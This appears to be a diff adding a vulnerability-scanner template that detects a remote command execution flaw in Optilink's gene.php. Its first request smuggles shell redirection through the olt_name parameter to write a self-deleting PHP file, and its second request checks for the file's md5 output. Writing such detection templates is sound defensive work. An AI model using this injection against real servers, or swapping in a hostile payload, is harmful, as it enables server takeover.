@@ -1,0 +1,44 @@
+id: optilink-gene-php-rce
+info:
+  name: Optilink Management System gene.php RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    An arbitrary command execution vulnerability in the gene.php file of a background management system product of Optilink, which can execute arbitrary commands or upload malicious PHP Trojans to control the server.
+  tags: command-execution,rce
+  reference:
+    - http://fofa.so
+  classification:
+    cvss-score: 10
+    cwe-id: CWE-94
+  metadata:
+    product: Optilink
+
+variables:
+  md5_payload: "<?php echo md5(1231);unlink(__FILE__);?>"
+
+http:
+  - raw:
+      - |
+        GET /cgi/fsystem/gene.php?olt_op=1&olt_name="{{md5_payload}}">4399.php; HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET /cgi/fsystem/4399.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "6c14da109e294d1e8155be8aa4b1ce8e"
+        part: body
